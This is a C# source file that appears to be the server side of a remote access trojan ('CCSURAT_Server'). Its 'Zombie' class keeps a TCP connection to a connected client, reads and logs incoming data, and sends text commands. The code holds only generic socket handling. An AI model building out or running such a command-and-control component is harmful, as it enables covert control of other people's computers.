using System;
using System.Net.Sockets;
using System.Windows.Forms;

namespace CCSURAT_Server
{
    class Zombie
    {
        private ServerMainForm mainForm;
        private TcpClient client;
        private NetworkStream netStream;
        public Zombie(ServerMainForm form, TcpClient client)
        {
            this.mainForm = form;
            this.client = client;
            this.netStream = client.GetStream();
            Console.Beep();
        }
        public void ListenForData()
        {
            try
            {
                while (true)
                {
                    if (netStream.DataAvailable)
                    {
                        byte[] bytes = new byte[1024];
                        string data = null;
                        int i;
                        if ((i = netStream.Read(bytes, 0, bytes.Length)) != 0)
                        {
                            // convert recieved bytes to text
                            data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                            Log("Data recieved: " + data);
                        }
                        Application.DoEvents();
                    }
                }
            }
            catch (Exception e)
            {
                Log("Stream lost connection.");
            }
        }

        // write data to client
        public void SendData(string s)
        {
            try {
                byte[] data = System.Text.Encoding.ASCII.GetBytes(s);
                netStream.Write(data, 0, data.Length);
                Log("Data sent: " + s);
            } catch(Exception ex)
            {
                Log("Error sending data: " + ex.ToString());
            }
        }

        private void Log(string s)
        {
            mainForm.Log(s);
        }
    }
}
